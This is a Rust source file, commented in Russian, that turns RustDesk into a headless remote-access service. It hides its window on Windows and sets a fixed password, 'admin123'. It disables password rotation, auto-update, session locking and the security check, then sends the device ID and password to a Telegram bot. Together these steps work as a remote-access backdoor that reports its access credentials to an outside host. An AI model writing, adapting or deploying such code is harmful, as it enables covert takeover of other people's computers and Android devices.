#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]

use librustdesk::*;
use hbb_common::config::Config;
use std::thread;
use std::time::Duration;

// Настройки Telegram бота
const TELEGRAM_BOT_TOKEN: &str = "YOUR_BOT_TOKEN_HERE";
const TELEGRAM_CHAT_ID: &str = "YOUR_CHAT_ID_HERE";
const STATIC_PASSWORD: &str = "admin123";

fn main() {
    start_headless_with_telegram();
}

fn start_headless_with_telegram() {
    // Инициализация
    if !common::global_init() {
        eprintln!("🚫 Global initialization failed.");
        return;
    }

    // Настройка статического пароля
    setup_static_config();

    // Получаем ID устройства
    let id = Config::get_id();

    println!("🚀 RustDesk Headless Service Starting...");
    println!("📱 Your ID: {}", id);
    println!("🔑 Static Password: {}", STATIC_PASSWORD);

    // Тестируем базовые сервисы
    common::test_rendezvous_server();
    common::test_nat_type();

    // Запускаем сервер в фоне
    start_server_headless();

    // Отправляем данные в Telegram
    send_to_telegram(&id, STATIC_PASSWORD);

    // Бесконечный цикл
    run_headless_loop();
}

fn setup_static_config() {
    use hbb_common::config::LocalConfig;

    // Устанавливаем статический пароль
    LocalConfig::set_option("password", STATIC_PASSWORD.to_string());

    // Отключаем автоматическую смену пароля
    LocalConfig::set_option("auto-change-password", "N".to_string());

    // Настройки для headless режима
    LocalConfig::set_option("enable-audio", "Y".to_string());
    LocalConfig::set_option("show-remote-cursor", "Y".to_string());
    LocalConfig::set_option("lock-after-session-end", "N".to_string());
    LocalConfig::set_option("allow-auto-update", "N".to_string());
    LocalConfig::set_option("security-check", "N".to_string());
}

fn start_server_headless() {
    // Запускаем сервер в отдельном потоке
    thread::spawn(|| {
        println!("🔄 Starting RustDesk server...");
        crate::start_server(true, false);
        println!("✅ RustDesk server started successfully");
    });
}

fn send_to_telegram(id: &str, password: &str) {
    thread::spawn(move || {
        // Ждем немного для инициализации сервера
        thread::sleep(Duration::from_secs(10));

        let message = format!(
            "🤖 RustDesk Connection Ready!\n\n📱 Device ID: `{}`\n🔑 Password: `{}`\n\n💻 Connect using RustDesk client",
            id, password
        );

        match send_telegram_message(&message) {
            Ok(_) => println!("✅ Credentials sent to Telegram"),
            Err(e) => eprintln!("❌ Failed to send to Telegram: {}", e),
        }
    });
}

fn send_telegram_message(message: &str) -> Result<(), Box<dyn std::error::Error>> {
    let url = format!(
        "https://api.telegram.org/bot{}/sendMessage",
        TELEGRAM_BOT_TOKEN
    );

    let client = reqwest::blocking::Client::new();
    let params = [
        ("chat_id", TELEGRAM_CHAT_ID),
        ("text", message),
        ("parse_mode", "Markdown")
    ];

    let response = client.post(&url).form(&params).send()?;

    if response.status().is_success() {
        Ok(())
    } else {
        Err(format!("HTTP {}: {}", response.status(), response.text()?).into())
    }
}

fn run_headless_loop() {
    println!("🎯 Headless mode activated");
    println!("📡 Ready for incoming connections...");

    // Простой keep-alive цикл
    let mut counter = 0;
    loop {
        thread::sleep(Duration::from_secs(30));
        counter += 1;

        // Периодический вывод статуса
        if counter % 20 == 0 {
            println!("💓 Headless service running... ({} minutes)", counter / 2);
        }
    }
}

// Специальная точка входа для Android
#[cfg(target_os = "android")]
#[no_mangle]
pub extern "C" fn android_main(_app: winit::platform::android::activity::AndroidApp) {
    println!("📱 Android headless service starting...");
    start_headless_with_telegram();
}